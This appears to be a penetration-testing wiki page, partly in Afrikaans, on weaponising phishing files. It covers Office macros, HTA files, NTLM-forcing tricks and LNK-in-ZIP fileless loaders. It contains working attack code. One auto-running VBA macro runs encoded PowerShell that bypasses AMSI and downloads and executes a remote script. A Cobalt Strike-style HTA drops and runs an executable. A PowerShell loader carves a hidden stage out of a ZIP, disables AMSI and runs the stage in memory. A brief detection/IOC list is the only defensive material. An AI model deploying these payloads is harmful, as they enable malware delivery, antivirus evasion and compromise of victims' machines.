# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêerdata-validering uit voordat 'n lêer geopen word. Data-validering word uitgevoer in die vorm van data-struktuur-identifikasie, teen die OfficeOpenXML-standaard. As enige fout voorkom tydens die data-struktuur-identifikasie, sal die lêer wat ontleed word nie geopen word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm` uitbreiding. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie macros nie, by ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees om macros uit te voer.\
Dieselfde interne strukture en meganismes geld vir alle sagteware in die Microsoft Office Suite (Excel, PowerPoint etc.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na 'n remote template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros bevat, kan ook macros uitvoer.

### Eksterne Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Kategorieë**: Skakels en Verwysings, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrêre kode vanaf die dokument uit te voer.

#### Autoload-funksies

Hoe meer algemeen dit is, hoe groter die waarskynlikheid dat AV dit sal opspoor.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Handmatig metadata verwyder

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc Extension

Wanneer klaar, kies die **Save as type** aftreklys en verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **can't save macro's inside a `.docx`** en daar 'n **stigma** is **around** die macro-enabled **`.docm`** uitbreiding (bv. die miniatuurikoon het 'n groot `!` en sommige web/email-gateways blokkeer hulle heeltemal). Daarom is hierdie **legacy `.doc` extension is the best compromise**.

#### Kwaadwillige Macro-generatoren

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-lêers

'n HTA is 'n Windows-program wat **HTML en skripprogrammeertale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word uitgevoer as 'n volledig vertroude toepassing, sonder die beperkings van 'n blaaier se sekuriteitsmodel.

'n HTA word uitgevoer met behulp van **`mshta.exe`**, wat gewoonlik **installed** is saam met **Internet Explorer**, wat **`mshta` dependant on IE** maak. As dit verwyder is, sal HTAs nie uitgevoer kan word nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Afdwing van NTLM Authentication

Daar is verskeie maniere om **dwing NTLM authentication "remotely" af**, byvoorbeeld, jy kan **onsigbare beelde** by e-posse of HTML invoeg wat die gebruiker sal laai (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **authentication** sal **trigger** slegs deur die gids te open.

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moet nie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **voer NTLM relay attacks uit**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Baie doeltreffende veldtogte lewer 'n ZIP wat twee regmatige lokdokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se rou bytes na 'n unieke merker gestoor word, en die .lnk dit uitsny en heeltemal in geheue uitvoer.

Tipiese vloei geïmplementeer deur die .lnk PowerShell one-liner:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouer van die huidige werkgids.
2) Lees die ZIP bytes en vind 'n hardgecodeerde merker (bv. xFIQCV). Alles na die merker is die ingeslote PowerShell payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lok-.docx om legitiem voor te kom.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate die volgende fase (bv. verwyder alle # karakters) en voer dit in geheue uit.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Aflewering misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads gate (bedien goedaardige ZIPs gebaseer op IP/UA).
- Die volgende fase ontsifer dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfartefakte te minimaliseer.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control sodat IE/Explorer of enige app wat dit inkorporeer die payload outomaties herbegin. Sien besonderhede en gereed-vir-gebruik opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (bv. xFIQCV) wat aan die argiefdata aangeheg is.
- .lnk wat ouer-/gebruikersgidse deurgaan om die ZIP te vind en 'n lokdokument oopmaak.
- AMSI-manipulasie via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende besigheidsdrade wat eindig met skakels wat onder betroubare PaaS-domeine gehost word.

## Windows-lêers om NTLM hashes te steel

Kyk na die bladsy oor **plekke om NTLM creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Verwysings

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
